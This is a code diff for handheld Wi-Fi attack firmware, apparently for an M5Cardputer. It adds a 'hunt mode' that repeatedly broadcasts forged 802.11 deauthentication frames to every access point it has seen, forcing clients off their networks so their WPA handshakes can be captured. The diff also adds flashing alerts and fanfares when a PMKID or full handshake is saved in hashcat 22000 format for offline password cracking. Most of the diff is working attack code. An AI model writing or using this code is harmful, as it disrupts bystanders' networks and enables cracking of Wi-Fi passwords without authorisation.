@@ -30,6 +30,13 @@ static volatile uint8_t  s_current_ch = 1;
 static volatile bool     s_running = false;
 static File              s_out;
 
+/* ---- notification state ---- */
+enum notify_kind_t { NTF_NONE, NTF_PMKID, NTF_HS };
+static volatile notify_kind_t s_notify = NTF_NONE;
+static volatile uint32_t      s_notify_start = 0;
+static char                   s_notify_ssid[33] = {0};
+#define NOTIFY_DURATION_MS 2500
+
 /* BSSID → SSID cache. */
 struct bssid_ssid_t { uint8_t bssid[6]; char ssid[33]; };
 #define BS_CACHE 32
@@ -117,6 +124,13 @@ static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t
     s_out.print(line);
     s_out.flush();
     s_pmkids++;
+
+    /* Raise notification — UI task polls this. */
+    strncpy(s_notify_ssid, ssid, sizeof(s_notify_ssid) - 1);
+    s_notify_ssid[sizeof(s_notify_ssid) - 1] = '\0';
+    if (!s_notify_ssid[0]) strcpy(s_notify_ssid, "(hidden)");
+    s_notify = NTF_PMKID;
+    s_notify_start = millis();
 }
 
 /* Emit WPA*02* (full 4-way handshake). Requires M1 ANonce and M2 EAPOL blob. */
@@ -147,6 +161,13 @@ static void emit_handshake(const uint8_t *bssid, const uint8_t *sta,
     s_out.print(line);
     s_out.flush();
     s_handshakes++;
+
+    /* Full 4-way handshake — most impressive, louder notification. */
+    strncpy(s_notify_ssid, ssid, sizeof(s_notify_ssid) - 1);
+    s_notify_ssid[sizeof(s_notify_ssid) - 1] = '\0';
+    if (!s_notify_ssid[0]) strcpy(s_notify_ssid, "(hidden)");
+    s_notify = NTF_HS;
+    s_notify_start = millis();
 }
 
 /* Parse an EAPOL-Key frame. Returns everything we need to know about it. */
@@ -303,6 +324,95 @@ static void hop_task(void *)
     vTaskDelete(nullptr);
 }
 
+/* Hunt mode: periodically broadcast-deauth every cached BSSID to
+ * force clients to re-handshake. Runs in parallel with promisc capture. */
+static volatile bool s_hunt = false;
+static uint8_t s_hunt_frame[26] = {
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0,0,0,0,0,0,
+    0,0,0,0,0,0,
+    0x00, 0x00,
+    0x07, 0x00,
+};
+
+static void hunt_task(void *)
+{
+    while (s_running) {
+        if (s_hunt && s_cache_n > 0) {
+            for (int i = 0; i < s_cache_n && s_running && s_hunt; ++i) {
+                memcpy(s_hunt_frame + 10, s_cache[i].bssid, 6);
+                memcpy(s_hunt_frame + 16, s_cache[i].bssid, 6);
+                /* Fire a burst of 3 frames on the current channel. */
+                for (int j = 0; j < 3; ++j) {
+                    esp_wifi_80211_tx(WIFI_IF_STA, s_hunt_frame,
+                                      sizeof(s_hunt_frame), false);
+                    delay(10);
+                }
+            }
+        }
+        delay(2000);
+    }
+    vTaskDelete(nullptr);
+}
+
+static void draw_notification(void)
+{
+    if (s_notify == NTF_NONE) return;
+    uint32_t age = millis() - s_notify_start;
+    if (age > NOTIFY_DURATION_MS) { s_notify = NTF_NONE; return; }
+
+    auto &d = M5Cardputer.Display;
+    bool big = (s_notify == NTF_HS);
+
+    /* Blink cycle: flash every 200ms for first half, solid for second. */
+    bool flash = (age < 1000) && ((age / 150) & 1);
+    uint16_t bg = big ? (flash ? COL_BAD : 0x4000) : (flash ? COL_GOOD : 0x0320);
+    uint16_t fg = big ? COL_WARN : COL_BG;
+
+    int bw = SCR_W - 16;
+    int bh = 44;
+    int bx = 8;
+    int by = (SCR_H - bh) / 2;
+
+    d.fillRoundRect(bx, by, bw, bh, 4, bg);
+    d.drawRoundRect(bx, by, bw, bh, 4, fg);
+    d.drawRoundRect(bx + 1, by + 1, bw - 2, bh - 2, 3, fg);
+
+    d.setTextColor(fg, bg);
+    d.setTextSize(2);
+    const char *hdr = big ? "HANDSHAKE!" : "PMKID!";
+    int tw = d.textWidth(hdr) * 2;
+    d.setCursor(bx + (bw - tw) / 2, by + 4);
+    d.print(hdr);
+
+    d.setTextSize(1);
+    d.setCursor(bx + 6, by + 26);
+    d.printf("%.30s", s_notify_ssid);
+
+    /* Side stripe indicator. */
+    for (int y = by + 3; y < by + bh - 3; y += 3) {
+        d.drawPixel(bx + 3, y, fg);
+        d.drawPixel(bx + bw - 4, y, fg);
+    }
+
+    /* Sound cue: only on the first frame of the notification. */
+    static uint32_t s_last_tone_start = 0;
+    if (s_notify_start != s_last_tone_start) {
+        s_last_tone_start = s_notify_start;
+        if (big) {
+            /* Three-note rising fanfare. */
+            M5Cardputer.Speaker.tone(1200, 120); delay(130);
+            M5Cardputer.Speaker.tone(1800, 120); delay(130);
+            M5Cardputer.Speaker.tone(2400, 240);
+        } else {
+            /* Short double-beep for PMKID. */
+            M5Cardputer.Speaker.tone(1500, 80);  delay(90);
+            M5Cardputer.Speaker.tone(2000, 120);
+        }
+    }
+}
+
 void feat_wifi_pmkid(void)
 {
     radio_switch(RADIO_WIFI);
@@ -320,15 +430,18 @@ void feat_wifi_pmkid(void)
     s_m1_n = 0;
     s_current_ch = 1;
     s_running = true;
+    s_hunt = false;
+    s_notify = NTF_NONE;
 
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(promisc_cb);
     esp_wifi_set_channel(s_current_ch, WIFI_SECOND_CHAN_NONE);
 
-    xTaskCreate(hop_task, "pmkid_hop", 3072, nullptr, 4, nullptr);
+    xTaskCreate(hop_task,  "pmkid_hop",  3072, nullptr, 4, nullptr);
+    xTaskCreate(hunt_task, "pmkid_hunt", 3072, nullptr, 3, nullptr);
 
     ui_clear_body();
-    ui_draw_footer("`=stop");
+    ui_draw_footer("H=hunt mode  `=stop");
     auto &d = M5Cardputer.Display;
     d.setTextColor(COL_BAD, COL_BG);
     d.setCursor(4, BODY_Y + 2); d.print("HANDSHAKE CAPTURE");
@@ -336,27 +449,35 @@ void feat_wifi_pmkid(void)
 
     uint32_t last = 0;
     while (true) {
-        if (millis() - last > 300) {
+        if (millis() - last > 200) {
             last = millis();
-            d.fillRect(0, BODY_Y + 18, SCR_W, 70, COL_BG);
+            d.fillRect(0, BODY_Y + 18, SCR_W, 90, COL_BG);
             d.setTextColor(COL_FG, COL_BG);
             d.setCursor(4, BODY_Y + 18); d.printf("channel:    %u", s_current_ch);
-            d.setCursor(4, BODY_Y + 30); d.printf("EAPOLs:     %lu", (unsigned long)s_eapol_seen);
+            d.setCursor(4, BODY_Y + 28); d.printf("APs seen:   %d", s_cache_n);
+            d.setCursor(4, BODY_Y + 38); d.printf("EAPOLs:     %lu", (unsigned long)s_eapol_seen);
             d.setTextColor(s_pmkids > 0 ? COL_GOOD : COL_DIM, COL_BG);
-            d.setCursor(4, BODY_Y + 42); d.printf("PMKIDs:     %lu", (unsigned long)s_pmkids);
+            d.setCursor(4, BODY_Y + 48); d.printf("PMKIDs:     %lu", (unsigned long)s_pmkids);
             d.setTextColor(s_handshakes > 0 ? COL_GOOD : COL_DIM, COL_BG);
-            d.setCursor(4, BODY_Y + 54); d.printf("Handshakes: %lu", (unsigned long)s_handshakes);
+            d.setCursor(4, BODY_Y + 58); d.printf("Handshakes: %lu", (unsigned long)s_handshakes);
+            d.setTextColor(s_hunt ? COL_BAD : COL_DIM, COL_BG);
+            d.setCursor(4, BODY_Y + 70); d.printf("HUNT:       %s", s_hunt ? "ON - deauthing" : "off");
             d.setTextColor(COL_DIM, COL_BG);
-            d.setCursor(4, BODY_Y + 70); d.print("/poseidon/hashcat.22000");
-            ui_draw_status(radio_name(), "capture");
+            d.setCursor(4, BODY_Y + 82); d.print("/poseidon/hashcat.22000");
+            ui_draw_status(radio_name(), s_hunt ? "hunt" : "capture");
+
+            /* Notification overlay drawn on top of stats. */
+            draw_notification();
         }
         uint16_t k = input_poll();
         if (k == PK_NONE) { delay(20); continue; }
         if (k == PK_ESC) break;
+        if (k == 'h' || k == 'H') s_hunt = !s_hunt;
     }
 
     s_running = false;
+    s_hunt = false;
     esp_wifi_set_promiscuous(false);
     if (s_out) { s_out.flush(); s_out.close(); }
-    delay(150);
+    delay(200);
 }
